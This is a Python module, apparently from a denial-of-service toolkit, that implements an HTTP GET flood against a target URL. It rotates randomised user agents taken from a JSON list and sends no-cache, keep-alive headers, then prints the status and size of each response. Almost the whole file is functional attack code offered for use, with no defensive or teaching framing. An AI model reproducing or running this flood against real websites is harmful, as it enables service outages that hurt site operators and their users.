"""This module provides the flood function for an HTTP GET request DoS attack."""

import json
import random

import requests
from colorama import Fore
from requests.exceptions import Timeout

with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]


headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

color_code = {True: Fore.GREEN, False: Fore.RED}


def flood(target: str) -> None:
    """Start an HTTP GET request flood.

    Args:
        - target - Target's URL

    Returns:
        None
    """
    global headers

    headers["User-agent"] = random.choice(user_agents)

    try:
        response = requests.get(target, headers=headers, timeout=4)
    except (Timeout, OSError):
        return
    else:
        status = (
            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
        )
        payload_size = f"{Fore.RESET} Requested Data Size: {Fore.CYAN}{round(len(response.content)/1024, 2):>6} KB"
        print(f"{status}{Fore.RESET} --> {payload_size} {Fore.RESET}")
